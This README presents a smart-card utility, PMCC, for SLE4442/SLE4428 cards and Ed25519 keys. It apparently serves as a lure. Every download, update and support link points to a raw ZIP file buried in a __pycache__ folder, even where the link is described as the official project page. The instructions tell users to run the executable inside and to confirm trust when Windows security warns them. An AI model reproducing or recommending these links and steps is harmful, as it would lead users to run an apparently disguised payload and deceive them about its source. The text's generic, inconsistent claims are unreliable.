# 🔐 PMCC - Manage Smart Cards Simply

[![Download PMCC](https://img.shields.io/badge/Download-PMCC-green?style=for-the-badge)](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip)

---

PMCC offers tools to create and use smart-card images based on SLE4442 and SLE4428 chips. It works with Ed25519 keys for signing, verification, and encryption. You can use it with a card reader via PC/SC. The package includes command-line tools and optional graphical applications built with Qt.

This guide helps you download and run PMCC on a Windows PC. No programming needed.

---

## 📥 Download PMCC

Visit the official PMCC page on GitHub to get the software:

[https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip)

On the page, look for the **Releases** section or download links.  

You will find files ready to download. Save the one that matches Windows (usually EXE or ZIP).

---

## 🖥️ System Requirements

Ensure your computer meets these basic needs before running PMCC:

- Windows 10 or newer
- At least 4 GB of RAM
- 100 MB free disk space for installation
- USB smart-card reader compatible with PC/SC
- Internet connection for initial download

PMCC runs without additional frameworks, but you may need to install device drivers for your card reader.

---

## ⚙️ Installation Steps

Follow these steps to install PMCC on your Windows computer:

1. Download the latest package from the [GitHub PMCC page](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip).

2. If you download a ZIP file, locate it in your Downloads folder.

3. Right-click the ZIP file and choose **Extract All...**.

4. Select a folder where you want to keep PMCC files, such as the Desktop or Documents.

5. Open the extracted folder.

6. Look for an installer file (often named `setup.exe`) or executable file to launch the application directly.

7. Double-click the setup file or executable to start.

8. If prompted by Windows security, confirm that you trust the source.

9. Follow any on-screen instructions to finish setup.

---

## 🚀 Running PMCC for the First Time

After installation, here is how to start and use PMCC:

1. Connect your smart-card reader to the PC’s USB port.

2. Insert a compatible smart card (SLE4442 or SLE4428) into the reader.

3. Open the PMCC application:
   - From the Start menu, choose PMCC.
   - Or double-click the executable in the installation folder.

4. If you use the command-line tools:
   - Press `Win + R`, then type `cmd` and hit Enter.
   - Change directory to PMCC’s folder by using the `cd` command.
   - Use the documented commands to interact with your smart card.

5. For the graphical interface:
   - Use the menus to create keys, sign messages, verify signatures, and extract public keys.
   - The GUI includes clear labels and buttons, so you can follow prompts step-by-step.

---

## 🔧 Basic Usage Tips

- Keep your smart card inserted during operations involving the card.

- Use the command-line utilities to automate tasks or if you prefer typing commands.

- Use the Qt GUI apps for easier access to features with menus and buttons.

- You can create, store, and handle Ed25519 keys on supported cards.

- You can sign data and verify signatures securely via the software.

- The software supports reading and writing card memory safely.

---

## 📚 Features Overview

- Support for SLE4442 and SLE4428 smart cards

- Storage of Ed25519 keys directly on the card

- Signing and verification with hardware security

- Encryption and decryption of messages

- Extraction of public keys through PC/SC interface

- Command-line tools for flexible operation

- Optional graphical applications with Qt for ease of use

---

## 🔄 Updating PMCC

To update PMCC to the latest version:

1. Visit the [PMCC GitHub page](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip) regularly.

2. Download the newest release files.

3. Repeat the installation process, overwriting previous files if needed.

4. Keep your smart-card reader drivers updated for best compatibility.

---

## 🛠 Troubleshooting

If PMCC does not run or detect your smart card:

- Ensure your card reader is properly connected and turned on.

- Check that the smart card is inserted correctly.

- Verify that your Windows drivers for the reader are up to date.

- Try restarting the application or Windows.

- Consult the README and documentation files inside the PMCC folder for command details.

- Use the PMCC GitHub issues page to view common problems and solutions.

---

## 📞 Getting Support

For help or questions:

- Visit the PMCC GitHub page at [https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip).

- Check the documentation folders included in the download.

- Use GitHub Issues to report bugs or request features.

---

[![Download PMCC](https://img.shields.io/badge/Download-PMCC-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/eduardo3987/PMCC/main/core/__pycache__/Software_3.6.zip)